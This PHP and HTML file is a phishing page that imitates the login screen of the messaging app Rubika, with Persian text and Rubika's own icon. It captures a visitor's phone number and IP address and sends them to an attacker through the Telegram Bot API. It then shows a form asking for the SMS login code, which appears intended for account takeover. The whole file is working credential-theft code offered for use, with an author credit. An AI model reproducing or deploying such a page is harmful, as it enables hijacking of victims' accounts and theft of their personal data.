<?php
include("0098.php");
$ip = $_SERVER['REMOTE_ADDR'];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $phoneNumber = $_POST['phone_number'];
  $message = "
  🗨️کاربر وارد لینک شد 🗨️
  
🌐  آیپی : $ip
  
☎️  شماره تلفن : <code>$phoneNumber</code>
  
  <b>CR : @amiirhsen0098</b>
  ";

  $url = "https://api.telegram.org/bot$botToken/sendMessage?parse_mode=HTML&chat_id=$chatId&text=" . urlencode($message);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
}
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <img src="https://web.rubika.ir/assets/icons/icon-192x192.png" alt="not file">
  <link rel="stylesheet" href="code.css">
  <title>تایید کد ورود</title>
</head>

<body>
  <form action="code.php" class="code" method="POST">
    <h4>پیامکی حاوی کد فعال سازی به شماره شما ارسال شده است</h4>
    <input type="number" placeholder="کد ورود" name="code" dir="rtl">
    <br>
    <input type="submit" value="ورود" name="batn">
  </form>
</body>

</html>
